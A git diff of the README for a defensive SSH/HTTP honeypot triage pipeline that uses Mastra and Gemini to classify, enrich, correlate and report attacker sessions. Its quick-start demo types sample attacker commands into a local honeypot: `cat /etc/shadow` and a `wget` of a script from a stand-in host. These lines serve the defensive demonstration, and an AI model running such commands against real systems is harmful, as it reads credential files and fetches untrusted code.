@@ -1,72 +1,77 @@
-<div align="center">
+# AI SOC Analyst
 
-# 🪤 AI SOC Analyst
-
-**An agentic honeypot triage pipeline.** Attackers hit a low-interaction SSH honeypot; a Mastra workflow grades every session, enriches it with threat intel, and writes analyst-readable reports.
+An agentic honeypot triage pipeline. Attackers hit a low-interaction SSH or HTTP
+honeypot; a Mastra workflow grades every session, enriches it with threat
+intelligence, and writes analyst-readable incident reports.
 
 [![Gemini](https://img.shields.io/badge/LLM-Google%20Gemini-4285F4?style=flat-square&logo=googlegemini&logoColor=white)](https://ai.google.dev/gemini-api)
 [![Mastra](https://img.shields.io/badge/framework-Mastra-8A2BE2?style=flat-square)](https://mastra.ai)
-[![License](https://img.shields.io/badge/license-Apache--2.0-green?style=flat-square)](LICENSE)
-
-</div>
+[![Node](https://img.shields.io/badge/node-22.13%2B-5FA04E?style=flat-square&logo=nodedotjs&logoColor=white)](https://nodejs.org)
+[![License](https://img.shields.io/badge/license-Apache--2.0-blue?style=flat-square)](LICENSE)
 
 ---
 
-## What it does
+## Overview
 
-A public SSH port gets scanned constantly. Most of it is noise; some of it is a real operator working their way toward a foothold. Telling those apart by hand is the boring part.
+Public ports are scanned continuously. Most of it is noise. Some of it is a real
+operator working toward a foothold. Separating the two by hand is the tedious
+part, and it does not scale past a handful of sessions a day.
 
-This project automates the boring part:
+This project automates the triage:
 
-- **Honeypot** — a low-interaction SSH server that accepts any credential and answers from a static table. It records what was tried, never runs it.
-- **HTTP honeypot** — a second low-interaction listener (`npm run honeypot:http`) for the scanning that HTTP actually attracts: admin panels, `.env` and `.git` probes, traversal attempts. Same no-execution guarantee, same event format, so HTTP hits correlate and triage alongside SSH ones.
-- **Triage** — a Mastra workflow classifies each session (`noise` / `recon` / `credential_stuffing` / `active_exploit_attempt`) with an LLM-graded severity 1–5.
-- **Enrichment** — geolocation and ASN via `ip-api.com`, optional AbuseIPDB reputation. Every lookup degrades gracefully: a missing key or a dead network produces a warning, never a crash.
-- **Correlation** — events from the same source IP inside a 30-minute window collapse into one campaign, persisted in LibSQL so they survive restarts.
-- **Reports** — markdown incident reports auto-generated the first time a campaign crosses severity 4 or 5 events, and refreshed as it grows.
-- **MCP server** — exposes `get_recent_campaigns`, `get_campaign_detail`, and `ask_soc_agent` to any MCP client.
-- **Dashboard** — live view of event volume, top sources, and open campaigns.
+| Component | Behaviour |
+| --- | --- |
+| SSH honeypot | Low-interaction `ssh2` server. Accepts any credential, answers from a static table, records what was tried. |
+| HTTP honeypot | Second listener for the traffic HTTP actually attracts: admin panels, `.env` and `.git` probes, traversal attempts. |
+| Triage | Mastra workflow classifies each session (`noise`, `recon`, `credential_stuffing`, `active_exploit_attempt`) with an LLM-graded severity 1-5. |
+| Enrichment | Geolocation and ASN via `ip-api.com`, optional AbuseIPDB reputation. Every lookup degrades to a warning, never a crash. |
+| Correlation | Events from one source IP inside a 30-minute window collapse into a campaign, persisted in LibSQL. |
+| Reports | Markdown incident reports generated when a campaign crosses severity 4 or 5 events, refreshed as it grows, and marked `closed` once it goes quiet. |
+| MCP server | Exposes `get_recent_campaigns`, `get_campaign_detail`, and `ask_soc_agent` to any MCP client. |
+| Dashboard | Live view of event volume, severity distribution, top sources, and campaign state. |
 
 ## Architecture
 
 ```
    attacker
-      │  ssh -p 2222
-      ▼
-┌──────────────────────┐
-│  SSH honeypot :2222  │   accepts any credential
-│  (ssh2, no exec)     │   static canned replies only
-└──────────┬───────────┘
-           │  data/events.jsonl
-           ▼
-┌──────────────────────┐
-│  Normalizer          │   JSONL → validated AttackEvent
-└──────────┬───────────┘
-           │
-           ▼
-┌──────────────────────────────────────────┐
-│  Mastra triage workflow                 │
-│                                          │
-│  classify ──► Gemini grades severity     │
-│      │                                   │
-│      ▼                                   │
-│  enrich   ──► ip-api.com / AbuseIPDB     │
-│             (degrades gracefully)        │
-└──────────┬───────────────────────────────┘
-           │  data/enriched.jsonl
-           ▼
-┌──────────────────────┐
-│  Correlation agent   │   same IP within 30 min -> one campaign
-│  (LibSQL, persists)  │   report at severity>=4 or >=5 events
-└──────────┬───────────┘
-           ▼
+      |  ssh -p 2222  /  http :8080
+      v
++----------------------------+
+|  Honeypots                 |   accepts any credential
+|  ssh2 + node:http          |   static canned replies only
+|  no exec, no shell         |   rotating event log
++-------------+--------------+
+              |  data/events.jsonl
+              v
++----------------------------+
+|  Normalizer                |   JSONL -> validated AttackEvent
+|  (zod)                     |   malformed lines skipped, never fatal
++-------------+--------------+
+              |
+              v
++----------------------------+
+|  Mastra triage workflow    |
+|                            |
+|  classify --> Gemini       |
+|      |        grades 1-5   |
+|      v                     |
+|  enrich  --> ip-api.com    |
+|             AbuseIPDB      |
+|             (graceful)     |
++-------------+--------------+
+              |  data/enriched.jsonl
+              v
++----------------------------+
+|  Correlation               |   same IP within 30 min -> one campaign
+|  LibSQL (persists)         |   auto-close after 24h idle
+|                            |   report at severity >= 4 or >= 5 events
++-------------+--------------+
+              |
+              v
       reports/*.md
-           │
-           ├──► dashboard (npm run dashboard)
-           └──► MCP server (npm run mcp)
-                 get_recent_campaigns
-                 get_campaign_detail
-                 ask_soc_agent
+              |
+              +--> dashboard   (npm run dashboard)
+              +--> MCP server  (npm run mcp)
 ```
 
 ## Quick start
@@ -78,31 +83,37 @@ git clone https://github.com/0xsan7/Honeypot.git
 cd Honeypot
 npm install
 cp .env.example .env      # add your GOOGLE_GENERATIVE_AI_API_KEY
-npm run setup             # host keys + landing page build + demo data
+npm run setup             # host keys, frontend build, demo data
 ```
 
-`npm run setup` takes about **15 seconds** on a warm npm cache and is
-idempotent — safe to re-run. It generates the honeypot host keys, installs and
-builds the `web/` frontend, and seeds demo campaigns so there is something to
-look at before you have an API key.
+`npm run setup` takes roughly 15 seconds on a warm npm cache and is idempotent.
+It generates the honeypot host keys, installs and builds the `web/` frontend, and
+seeds demo campaigns so there is something to look at before you have a key.
 
-Get a free Gemini key at [aistudio.google.com/apikey](https://aistudio.google.com/apikey) (starts with `AIza`). The key is only needed for live triage — everything else, including the demo, works without it.
+Get a free Gemini key at [aistudio.google.com/apikey](https://aistudio.google.com/apikey).
+It begins with `AIza`. The key is only needed for live triage; the honeypot,
+correlation, reporting, dashboard, and MCP server all work without it.
 
-Then, in two terminals:
+### Run it
+
+Two terminals:
 
 ```bash
-# 1 — start the honeypot
+# terminal 1
 npm run honeypot
-
-# 2 — attack it, then triage what it caught
-ssh -p 2222 root@127.0.0.1    # any password works
-whoami
-cat /etc/shadow
-
-npm run pipeline
 ```
 
-Output:
+```bash
+# terminal 2
+ssh -p 2222 root@127.0.0.1     # any password is accepted
+whoami
+cat /etc/shadow
+wget http://10.0.0.1/x.sh
+
+npm run pipeline               # triage what was captured
+```
+
+The honeypot answers from a static table. Nothing it is told is ever executed.
 
 ```
 [5] active_exploit_attempt   127.0.0.1 user=root pass=admin123 cmds=4
@@ -111,12 +122,14 @@ Output:
       warnings: skipped geo lookup for private IP; AbuseIPDB skipped: no key
 ```
 
-**Out of Gemini quota?** Seed realistic enriched events and exercise the whole
-second half of the pipeline without spending a single request:
+### Without an API key
+
+The free Gemini tier allows roughly 20 classifications a day. To exercise the
+whole second half of the pipeline at no cost:
 
 ```bash
-npm run seed        # 9 synthetic enriched events
-npm run correlate   # group into campaigns, generate reports
+npm run seed        # 20 synthetic enriched events
+npm run correlate   # group into campaigns, write reports
 ```
 
 ```
@@ -124,78 +137,49 @@ npm run correlate   # group into campaigns, generate reports
       REPORT: reports/campaign-9993a6d3-....md
 ```
 
-Then view it:
+### View it
 
 ```bash
 npm run dashboard   # landing page at /, console at /dashboard
 npm run mcp         # MCP server on stdio
+npm run dev         # Mastra Studio at localhost:4111
 ```
 
-The site has two views: a React landing page at `/` and the live SOC console at `/dashboard`.
+The site serves two views: a React landing page at `/` and the SOC console at
+`/dashboard`, both on `http://127.0.0.1:4173`.
 
-![SOC Analyst landing page](docs/landing.png)
-
-## Building the site
-
-The landing page is a Vite + React + Tailwind app in `web/`, kept separate from the
-Mastra backend. The console (`src/mastra/public/dashboard.html`) is dependency-free
-static HTML and needs no build step.
-
-```bash
-cd web && npm install && npm run build
-```
-
-`npm run dashboard` serves the built output; if `web/dist` is missing it says so
-rather than failing silently.
+![Landing page](docs/landing.png)
 
 ## Commands
 
-| Command | What it does |
+| Command | Description |
 | --- | --- |
+| `npm run setup` | Host keys, frontend build, and demo data in one command |
 | `npm run honeypot` | Start the SSH honeypot on `:2222` |
-| `npm run pipeline` | Triage every captured event through the LLM |
+| `npm run honeypot:http` | Start the HTTP honeypot on `:8080` |
+| `npm run pipeline` | Triage captured events through the LLM |
 | `npm run correlate` | Group enriched events into campaigns, write reports |
-| `npm run seed` | Seed synthetic enriched events (no LLM calls) |
-| `npm run dashboard` | Live dashboard on [127.0.0.1:4173](http://127.0.0.1:4173) |
+| `npm run seed` | Seed 20 synthetic enriched events (no LLM calls) |
+| `npm run dashboard` | Serve the site on `127.0.0.1:4173` |
 | `npm run mcp` | MCP server on stdio (3 tools) |
-| `npm run probe` | Drive synthetic SSH sessions at the honeypot |
-| `npm run dev` | Mastra Studio on [localhost:4111](http://localhost:4111) |
-| `npm test` | Run the test suite (mocked LLM — no API calls) |
-| `npm run test:all` | Unit tests + typecheck + MCP wire test + pipeline failure test |
-| `npm run test:mcp` | Connect a real MCP client over stdio and call the tools |
-| `npm run test:pipeline` | Assert the pipeline exits non-zero and explains why when it fails |
-| `npm run test:mcp-robustness` | Throw 11 hostile inputs at the MCP server; it must not crash |
-| `npm run test:autoclose` | Prove campaign auto-close persists across separate processes |
-| `npm run verify:honeypot` | Prove the no-execution invariant against a running honeypot |
-| `npm run setup` | Host keys + frontend build + demo data (one command) |
-| `npm run typecheck` | `tsc --noEmit` |
+| `npm run backup` | Consistent copy of the campaign store via `VACUUM INTO` |
 | `npm run keys` | Regenerate honeypot host keys |
+| `npm run dev` | Mastra Studio on `localhost:4111` |
+| `npm run probe` | Drive synthetic SSH sessions at the honeypot |
+| `npm test` | Unit tests, LLM mocked (no API calls) |
+| `npm run typecheck` | `tsc --noEmit` |
+| `npm run test:all` | Every suite below, in order |
+| `npm run test:mcp` | Real MCP client completes a handshake and calls tools |
+| `npm run test:mcp-robustness` | 11 malformed calls; the server must not crash |
+| `npm run test:pipeline` | Pipeline exits non-zero and explains why when it fails |
+| `npm run test:autoclose` | Campaign auto-close persists across processes |
+| `npm run test:http` | HTTP honeypot over a real socket (26 assertions) |
+| `npm run verify:honeypot` | No-execution invariant, against a running honeypot |
+| `npm run test:concurrency` | N simultaneous sessions, one event each |
 
 ## MCP server
 
-Exposes three tools over stdio: `get_recent_campaigns`, `get_campaign_detail`,
-and `ask_soc_agent`.
-
-```bash
-npm run mcp
-```
-
-**Version constraint.** `@mastra/mcp` is pinned to **1.18.0**, not 2.x. The 2.x
-line depends on `@modelcontextprotocol/server@2.0.0`, which speaks only the
-`2026-07-28` protocol and requires a per-request envelope claim. No published MCP
-client supports that version yet — the newest client SDK tops out at `2025-11-25` —
-so a 2.x server cannot be connected to by any real client. 1.18.0 pulls in
-`@modelcontextprotocol/server-legacy`, which negotiates the 2025-era protocols that
-Claude Desktop, Cursor, and VS Code actually speak.
-
-`npm run test:mcp` proves this over the wire: it spawns the server as a child
-process, connects with the official client SDK, lists the tools, and calls two of
-them against a seeded store. An earlier in-process test passed while no client
-could connect, so the wire test is the one that counts.
-
-```bash
-npm run mcp
-```
+Three tools are exposed over stdio.
 
 | Tool | Purpose |
 | --- | --- |
@@ -203,7 +187,11 @@ npm run mcp
 | `get_campaign_detail` | One campaign plus every enriched event in it |
 | `ask_soc_agent` | Free-text questions, answered from stored data only |
 
-Add it to any MCP client (e.g. `claude_desktop_config.json`):
+```bash
+npm run mcp
+```
+
+Register it with any MCP client:
 
 ```json
 {
@@ -211,53 +199,109 @@ Add it to any MCP client (e.g. `claude_desktop_config.json`):
     "soc-analyst": {
       "command": "npm",
       "args": ["run", "mcp"],
-      "cwd": "/absolute/path/to/soc-analyst"
+      "cwd": "/absolute/path/to/Honeypot"
     }
   }
 }
 ```
 
+### Version constraint
+
+`@mastra/mcp` is pinned to **1.18.0**. Do not upgrade to 2.x without reading
+this first.
+
+The 2.x line depends on `@modelcontextprotocol/server@2.0.0`, which speaks only
+the `2026-07-28` protocol and additionally requires a per-request envelope claim
+in `params._meta`. That server reports `supported: ["2026-07-28"]` while
+rejecting `2026-07-28` from a conforming client, and no published client SDK
+supports the version at all, since the newest tops out at `2025-11-25`. The
+result is a server that no real client can connect to.
+
+1.18.0 pulls in `@modelcontextprotocol/server-legacy`, which negotiates the
+2025-era protocols that Claude Desktop, Cursor, and VS Code actually speak.
+
+`npm run test:mcp` proves this over the wire. An earlier in-process test passed
+while no client could connect at all, so the wire test is the one that counts.
+
 ## Configuration
 
-| Variable | Required | Purpose |
-| --- | --- | --- |
-| `GOOGLE_GENERATIVE_AI_API_KEY` | yes | Gemini key for classification |
-| `ABUSEIPDB_API_KEY` | no | Reputation scores; skipped when absent |
-| `HONEYPOT_PORT` | no | Defaults to `2222` |
-| `HONEYPOT_BIND` | no | Defaults to `127.0.0.1` (loopback) |
-| `HONEYPOT_LOG` | no | Defaults to `data/events.jsonl` |
-| `HTTP_HONEYPOT_PORT` | no | HTTP honeypot port, defaults to `8080` |
-| `HTTP_HONEYPOT_BIND` | no | Defaults to `127.0.0.1` (loopback) |
-| `CAMPAIGN_WINDOW_MS` | no | Correlation window, defaults to 30 minutes |
-| `CAMPAIGN_IDLE_CLOSE_MS` | no | Auto-close an idle campaign after this long, defaults to 24 hours |
-| `REPORT_DIR` | no | Defaults to `reports/` |
-| `DASHBOARD_PORT` | no | Defaults to `4173` |
-| `TURSO_DATABASE_URL` | no | Remote LibSQL; defaults to `file:./soc-analyst.db` |
+Secrets are read from `.env`, never hardcoded. `.env.example` documents every
+variable.
+
+| Variable | Required | Default | Purpose |
+| --- | --- | --- | --- |
+| `GOOGLE_GENERATIVE_AI_API_KEY` | for live triage | none | Gemini key for classification |
+| `ABUSEIPDB_API_KEY` | no | none | Reputation scores; skipped when absent |
+| `HONEYPOT_PORT` | no | `2222` | SSH honeypot port |
+| `HONEYPOT_BIND` | no | `127.0.0.1` | Set `0.0.0.0` only on infrastructure you own |
+| `HTTP_HONEYPOT_PORT` | no | `8080` | HTTP honeypot port |
+| `HTTP_HONEYPOT_BIND` | no | `127.0.0.1` | Set `0.0.0.0` only on infrastructure you own |
+| `HONEYPOT_LOG` | no | `data/events.jsonl` | Event log path |
+| `HONEYPOT_VERBOSE` | no | off | Log every HTTP request, not just probes |
+| `LOG_MAX_BYTES` | no | `52428800` | Rotate the event log at 50 MB |
+| `LOG_MAX_FILES` | no | `5` | Rotated generations to keep (~250 MB ceiling) |
+| `MAX_CONNECTIONS` | no | `64` | Concurrent sessions per listener |
+| `MAX_PER_IP` | no | `8` | Concurrent sessions from one source IP |
+| `CAMPAIGN_WINDOW_MS` | no | `1800000` | Correlation window (30 minutes) |
+| `CAMPAIGN_IDLE_CLOSE_MS` | no | `86400000` | Auto-close an idle campaign after 24 hours |
+| `REPORT_DIR` | no | `reports/` | Where reports are written |
+| `DASHBOARD_PORT` | no | `4173` | Dashboard port |
+| `BACKUP_DIR` | no | `backup/` | Where `npm run backup` writes |
+| `TURSO_DATABASE_URL` | no | `file:./soc-analyst.db` | Remote LibSQL, or local file |
 
 ## Security model
 
-This is a **defensive** tool. It observes traffic aimed at infrastructure the operator controls.
+This is a defensive tool. It observes traffic directed at infrastructure the
+operator controls, and does not scan, probe, or interact with third-party
+systems.
 
-- **No command execution, ever.** There is no `child_process`, no shell, no `spawn` in the honeypot. Attacker commands are recorded as strings and answered from a static lookup table. This is enforced by construction — there is no code path from attacker input to a real process, and it does not depend on any LLM or runtime judgement.
-- **Loopback by default.** The honeypot binds `127.0.0.1`. Set `HONEYPOT_BIND=0.0.0.0` only on infrastructure you own.
-- **No scanning.** Nothing here probes or touches third-party systems.
-- **Free-tier only.** Geolocation uses `ip-api.com`'s free tier with retry/backoff on 429s.
-- **Credentials in examples are synthetic** (`admin123`, `password`), generated by the test probe — never scraped.
+**Commands are recorded, never executed.** Neither honeypot contains
+`child_process`, a shell, `spawn`, `eval`, or `new Function`. Attacker input is
+stored as strings and answered from static lookup tables. The guarantee is
+structural rather than policy-based: there is no code path from a request to a
+real process, and it does not depend on any LLM or runtime judgement.
+`npm run test:http` asserts this by scanning the source, and
+`npm run verify:honeypot` asserts the observable behaviour against a live
+honeypot.
+
+Beyond that:
+
+- **Loopback by default.** Both listeners bind `127.0.0.1`. Binding `0.0.0.0`
+  is an explicit decision and belongs only on infrastructure you own.
+- **Bounded resource use.** The event log rotates by size, so a busy port
+  cannot fill the disk. Connections are capped per listener and per source IP;
+  at capacity a new connection is refused rather than dropping a live session,
+  since a scanner will retry but a killed session loses its capture.
+- **No secrets committed.** `.env`, host keys, databases, event logs, and
+  generated reports are all gitignored.
+- **Free-tier geolocation.** Uses the `ip-api.com` free tier with retry and
+  backoff on 429s.
+- **Synthetic credentials in examples.** The `admin123` and `password` values
+  in this README and in `examples/` are generated by the test probe. Nothing
+  was scraped from a real attacker.
+- **Passwords captured from basic auth are never logged.** The username is
+  retained for attribution; the password is discarded.
 
 ## Rate limits
 
-Gemini's free tier allows roughly **20 classification requests per day** on `gemini-3.5-flash`. When you hit it, the pipeline logs the failure for that event and continues with the rest — nothing crashes, and events that did succeed are still written.
+Gemini's free tier allows roughly 20 classification requests per day on
+`gemini-3.5-flash`. When the quota is exhausted the pipeline logs the failure
+for that event, continues with the rest, and writes everything that did
+succeed.
 
-The command then **exits non-zero** so a script or CI notices, and prints the fix:
+If nothing could be enriched, the command exits non-zero so a script or cron
+job notices, and prints the cause:
 
 ```
 Enriched 0/20 event(s) -> data/enriched.jsonl
 PIPELINE FAILED: no events were enriched.
-  Gemini quota exhausted. The free tier allows ~20 requests/day — wait for the
+  Gemini quota exhausted. The free tier allows ~20 requests/day -- wait for the
   reset, or run `npm run seed` to demo without an LLM.
 ```
 
-If you need more throughput, set a billing-enabled key or point `CLASSIFIER_MODEL` at a different model in `src/mastra/triage.ts`.
+Correlation and reporting make no LLM calls, so they are unaffected by quota.
+For higher throughput, use a billing-enabled key or change `CLASSIFIER_MODEL` in
+`src/mastra/triage.ts`.
 
 ## Testing
 
@@ -265,70 +309,89 @@ If you need more throughput, set a billing-enabled key or point `CLASSIFIER_MODE
 npm run test:all
 ```
 
-Per-criterion manual verification — what a real pass looks like for each, and
-the commands to run it — is in **[TESTING.md](TESTING.md)**.
-
-Five layers:
-
 | Suite | What it proves |
 | --- | --- |
-| `npm test` | 31 unit tests, LLM mocked — no API calls, costs nothing |
+| `npm test` | 47 unit tests, LLM mocked, no API calls |
 | `npm run typecheck` | `tsc --noEmit` |
-| `npm run test:mcp` | A real MCP client completes a handshake, lists all 3 tools, and calls 2 against a seeded store |
-| `npm run test:mcp-robustness` | 11 malformed calls produce clean errors, never a crash |
+| `npm run test:mcp` | A real MCP client completes a handshake, lists all three tools, and calls two against a seeded store |
+| `npm run test:mcp-robustness` | 11 malformed calls return clean errors; the server survives all of them |
 | `npm run test:pipeline` | With the API key removed, the pipeline exits non-zero, writes nothing, and prints a fix |
-| `npm run test:autoclose` | An idle campaign becomes `closed`, read back by a separate process |
+| `npm run test:autoclose` | An idle campaign becomes `closed`, confirmed by a separate process reading the store |
+| `npm run test:http` | The HTTP honeypot serves decoys, records events, survives hostile input, and contains no execution primitive |
+| `npm run verify:honeypot` | The no-execution invariant, against a running honeypot |
+| `npm run test:concurrency` | N simultaneous sessions each produce exactly one uniquely identified event |
 
-The three boundary tests exist because those bugs were invisible to the unit
-tests. The original in-process MCP test passed while **no MCP client could
-connect**, the pipeline exited `0` while writing **zero enriched events**, and
-the honeypot verifier exited `0` with **nothing listening**. All three are
-failures that only show up across a real boundary.
+The boundary suites exist because those defects were invisible to unit tests.
+The original in-process MCP test passed while no MCP client could connect. The
+pipeline exited `0` after writing zero enriched events. The honeypot verifier
+exited `0` with nothing listening. Three separate cases of a green result that
+verified nothing, which is the failure mode worth engineering against.
 
-## Deploying
+[TESTING.md](TESTING.md) documents manual verification for each acceptance
+criterion, including what a genuine pass looks like.
 
-See **[DEPLOY.md](DEPLOY.md)** for running this on a public VPS: provider
-choice, firewall, systemd units, backups, and what not to expose.
+## Deployment
 
-Short version: the honeypots bind to `0.0.0.0` deliberately, but the dashboard
-and MCP server have **no authentication** and must stay on `127.0.0.1`, reached
-via `ssh -L 4173:127.0.0.1:4173 you@host`.
+[DEPLOY.md](DEPLOY.md) covers running this on a public VPS: provider selection,
+firewall rules, systemd units with filesystem sandboxing, backups, and what must
+not be exposed.
+
+The honeypots bind `0.0.0.0` deliberately. The dashboard and MCP server have no
+authentication and must stay on `127.0.0.1`, reachable over a tunnel:
+
+```bash
+ssh -N -L 4173:127.0.0.1:4173 you@host
+```
+
+A tunnel is not a substitute for a real VPS. Mass scanners, Shodan, and Censys
+enumerate IP address space; they do not resolve tunnel hostnames, so a
+honeypot behind ngrok or similar is never discovered and collects no unsolicited
+traffic.
 
 ## Project layout
 
 ```
 src/
-  honeypot/ssh-server.ts   low-interaction SSH honeypot
+  honeypot/
+    ssh-server.ts          low-interaction SSH honeypot
+    http-server.ts         low-interaction HTTP honeypot
+    event-log.ts           size-based rotation, bounded disk use
+    connection-limiter.ts  concurrency cap, per listener and per IP
   mastra/
     index.ts               Mastra registration (agents, tools, workflows)
     schemas.ts             zod schemas: AttackEvent / EnrichedEvent / Campaign
-    normalizer.ts          JSONL → validated events
-    triage.ts              classify → enrich workflow
+    normalizer.ts          JSONL -> validated events, rotation-aware tailing
+    triage.ts              classify -> enrich workflow
     enrich.ts              geo / ASN / reputation, degrades gracefully
-    store.ts               LibSQL campaign store (persists across restarts)
-    report.ts              markdown incident report generator
+    store.ts               LibSQL campaign store with auto-close
+    report.ts              deterministic markdown report generator
     mcp-server.ts          MCP exposure (3 tools)
     agents/soc-agent.ts    memory-backed analyst agent
-    public/index.html      dashboard
-scripts/
-  run-pipeline.ts          honeypot events → enriched events
-  correlate.ts             enriched events → campaigns + reports
-  seed-enriched.ts         synthetic events for testing without an LLM
-  probe-honeypot.ts        synthetic attacker sessions
-  dashboard.ts             serves the dashboard
-  test-mcp.ts              verifies MCP tool names
-tests/                     14 tests, all mocked
-reports/                   generated incident reports
+    public/dashboard.html  SOC console (no build step)
+scripts/                   pipeline, correlation, seeding, and 6 test harnesses
+tests/                     47 unit tests across 5 files
+web/                       React + Vite landing page (separate build)
+examples/                  committed sample reports, synthetic data only
 ```
 
-## Roadmap
+`DECISIONS.md` records the reasoning behind design calls, including several that
+were reversed once their consequences were measured. `PRD.md` is the original
+specification.
 
-Milestones 1 and 2 are done: honeypot, triage, correlation, reports, MCP
-exposure, and the dashboard. Not yet built: a live Mastra Studio traces
-integration test, and campaign auto-closing after a quiet period.
+## Status
 
-See [PRD.md](PRD.md) for the full specification.
+Complete and verified end to end: both honeypots, the triage workflow,
+correlation with auto-close, deterministic reporting, the MCP server, the
+dashboard, and the deployment documentation.
+
+Not yet done:
+
+- No live Mastra Studio trace capture or demo recording.
+- Single-event campaigns are covered by tests, but the seed data does not
+  produce them naturally.
+- Reputation enrichment is wired and degrades correctly, but has only been
+  exercised without an AbuseIPDB key.
 
 ## License
 
-Apache-2.0
+Apache-2.0. See [LICENSE](LICENSE).
